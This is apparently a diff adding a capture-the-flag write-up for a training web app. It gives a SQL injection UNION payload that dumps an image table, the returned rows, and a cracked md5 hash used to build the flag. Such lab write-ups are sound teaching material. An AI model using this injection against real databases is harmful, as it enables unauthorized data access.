@@ -1,0 +1,30 @@
+# Run the following:
+1 UNION (SELECT CONCAT(url, title), comment FROM Member_images.list_images) 
+
+# Formatted result is:
+
+url: https://www.nsa.org/img.jpg
+title: Nsa
+comment: An image about the NSA !
+
+url: https://www.42.fr/42.png
+title: 42 !
+comment: There is a number..
+
+url: https://www.google.fr/google.png
+title: Google
+comment: Google it !
+
+url: https://www.obama.org/obama.jpgObama
+title:
+comment: Yes we can !
+
+url: borntosec.ddns.net/images.png
+title: Hack me ?
+comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+url: https://www.h4x0r3.0rg/tr0ll.png
+title: tr00l
+comment: Because why not ?
+
+# Decoded 1928e8083cf461a51303633093573c46 corresponds to albatroz
